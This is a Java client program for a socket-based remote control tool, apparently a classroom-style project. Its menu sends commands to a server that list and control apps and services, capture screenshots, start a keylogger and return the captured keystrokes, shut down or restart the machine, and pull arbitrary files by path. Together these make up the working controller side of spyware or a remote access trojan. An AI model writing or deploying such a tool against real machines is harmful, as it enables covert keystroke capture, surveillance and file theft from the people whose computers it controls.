import java.io.*;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;

public class Client {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("localhost", 5000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter writer = new PrintWriter(socket.getOutputStream());

            String fileAddress = Paths.get("").toAbsolutePath().toString() + "/";
            Path filePathChecker = Paths.get(fileAddress);
            String response = "";

            Scanner sc = new Scanner(System.in);
            boolean exit = false;

            while (!exit) {
                System.out.println("\n MENU");
                System.out.println("0. Exit");
                System.out.println("1. Get Apps");
                System.out.println("2. Get Services");
                System.out.println("3. Start App");
                System.out.println("4. Stop App");
                System.out.println("5. Start Service");
                System.out.println("6. Stop Service");
                System.out.println("7. Take Screenshot");
                System.out.println("8. Start Keylogger");
                System.out.println("9. Stop and Return Keylogger");
                System.out.println("10. Shutdown");
                System.out.println("11. Restart");
                System.out.println("12. Cancel Shutdown/ Restart");
                System.out.println("13. Collect File via Location");
                System.out.println("\nEnter your choice: ");

                int choice = sc.nextInt();
                sc.nextLine();

                switch (choice) {
                    case 0:
                        exit = true;
                        break;

                    case 1:
                        writer.println("get-apps");
                        writer.flush();

                        response = reader.readLine();
                        List<String> apps = Arrays.asList(response.split(";"));

                        Path filePathApps = Paths.get(fileAddress + "/apps.txt");

                        if (Files.isDirectory(filePathChecker.getParent()) && Files.isWritable(filePathChecker)) {
                            try (BufferedWriter bw = Files.newBufferedWriter(filePathApps)) {
                                for (String app : apps) {
                                    bw.write(app);
                                    bw.newLine();
                                }
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                            System.out.println("A new file has been added to: " + fileAddress);
                        } else {
                            System.out.println("Invalid file address or write permissions denied.");
                        }
                        break;

                    case 2:
                        writer.println("get-services");
                        writer.flush();

                        response = reader.readLine();
                        byte[] serviceBytes = response.getBytes();

                        Path filePathServices = Paths.get(fileAddress + "/services.txt");

                        if (Files.isDirectory(filePathChecker.getParent()) && Files.isWritable(filePathChecker)) {
                            Files.write(filePathServices, serviceBytes);
                            System.out.println("A new file has been added to: " + fileAddress);
                        } else {
                            System.out.println("Invalid file address or write permissions denied.");
                        }
                        break;

                    case 3:
                        System.out.println("Enter the name of the app you want to start: ");
                        String appNameStart = sc.nextLine();

                        writer.println("start-app-" + appNameStart);
                        writer.flush();

                        response = reader.readLine();
                        if (response.equals("true")) {
                            System.out.println("The app has been started");
                        } else System.out.println("The app hasn't been started");
                        break;

                    case 4:
                        System.out.println("Enter the name of the app you want to stop: ");
                        String appNameStop = sc.nextLine();

                        writer.println("stop-app-" + appNameStop);
                        writer.flush();

                        response = reader.readLine();
                        if (response.equals("true")) {
                            System.out.println("The app has been stopped");
                        } else System.out.println("The app hasn't been stopped");
                        break;

                    case 5:
                        System.out.println("Enter the name of the service you want to start: ");
                        String serviceNameStart = sc.nextLine();

                        writer.println("start-service-" + serviceNameStart);
                        writer.flush();

                        response = reader.readLine();
                        if (response.equals("true")) {
                            System.out.println("The service has been started");
                        } else System.out.println("The service hasn't been started");
                        break;

                    case 6:
                        System.out.println("Enter the name of the service you want to stop: ");
                        String serviceNameStop = sc.nextLine();

                        writer.println("stop-service-" + serviceNameStop);
                        writer.flush();

                        response = reader.readLine();
                        if (response.equals("true")) {
                            System.out.println("The service has been stopped");
                        } else System.out.println("The service hasn't been stopped");
                        break;

                    case 7:
                        writer.println("screenshot");
                        writer.flush();

                        int screenshotSize = Integer.parseInt(reader.readLine());
                        byte[] screenshotBytes = new byte[screenshotSize];

                        int totalBytesReadScreenshot = 0;
                        int bytesReadScreenshot = 0;

                        while (totalBytesReadScreenshot < screenshotSize) {
                            bytesReadScreenshot = socket.getInputStream().read(screenshotBytes, totalBytesReadScreenshot, screenshotBytes.length - totalBytesReadScreenshot);
                            if (bytesReadScreenshot == -1) {
                                System.out.println("End of stream reached before all bytes were read.");
                                break;
                            }
                            totalBytesReadScreenshot += bytesReadScreenshot;
                            if (totalBytesReadScreenshot >= screenshotSize) break;
                        }

                        if (totalBytesReadScreenshot >= screenshotSize) {
                            System.out.println("Insert file name (please add .jpeg at the back): ");
                            String fileName = sc.nextLine();

                            Path filePathScreenshot = Paths.get(fileAddress + fileName);

                            if (Files.isDirectory(filePathChecker.getParent()) && Files.isWritable(filePathChecker)) {
                                Files.write(filePathScreenshot, screenshotBytes);
                                System.out.println("A new file has been added to: " + fileAddress);
                            } else {
                                System.out.println("Invalid file address or write permissions denied.");
                            }
                        } else {
                            System.out.println("Incomplete file transfer.");
                        }
                        break;

                    case 8:
                        writer.println("start-keylogger");
                        writer.flush();
                        response = reader.readLine();
                        System.out.println(response);
                        break;

                    case 9:
                        writer.println("stop-keylogger");
                        writer.flush();

                        response = reader.readLine();
                        byte[] keyloggerBytes = response.getBytes();

                        Path filePathKeylogger = Paths.get(fileAddress + "/keylogger.txt");

                        if (Files.isDirectory(filePathChecker.getParent()) && Files.isWritable(filePathChecker)) {
                            Files.write(filePathKeylogger, keyloggerBytes);
                            System.out.println("A new file has been added to: " + fileAddress);
                        } else {
                            System.out.println("Invalid file address or write permissions denied.");
                        }
                        break;

                    case 10:
                        writer.println("shutdown");
                        writer.flush();
                        response = reader.readLine();
                        System.out.println(response);
                        break;

                    case 11:
                        writer.println("restart");
                        writer.flush();
                        response = reader.readLine();
                        System.out.println(response);
                        break;

                    case 12:
                        writer.println("cancel-shutdown");
                        writer.flush();
                        response = reader.readLine();
                        System.out.println(response);
                        break;

                    case 13:
                        System.out.println("Insert the server path to the file: ");
                        String filePathServer = sc.nextLine();
                        writer.println("collect-" + filePathServer);
                        writer.flush();

                        int fileSize = Integer.parseInt(reader.readLine());
                        byte[] fileBytes = new byte[fileSize];
                        int totalBytesReadFile = 0;
                        int bytesReadFile = 0;

                        while (totalBytesReadFile < fileSize) {
                            bytesReadFile = socket.getInputStream().read(fileBytes, totalBytesReadFile, fileBytes.length - totalBytesReadFile);
                            if (bytesReadFile == -1) {
                                System.out.println("End of stream reached before all bytes were read.");
                                break;
                            }
                            totalBytesReadFile += bytesReadFile;
                        }

                        if (totalBytesReadFile == fileSize) {
                            System.out.println("Insert file name: ");
                            String fileName = sc.nextLine();

                            Path filePathUser = Paths.get(fileAddress + fileName);

                            if (Files.isDirectory(filePathChecker.getParent()) && Files.isWritable(filePathChecker)) {
                                Files.write(filePathUser, fileBytes);
                                System.out.println("A new file has been added to: " + fileAddress);
                            } else {
                                System.out.println("Invalid file address or write permissions denied.");
                            }
                        } else {
                            System.out.println("Incomplete file transfer.");
                        }
                        break;

                    default:
                        throw new AssertionError();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
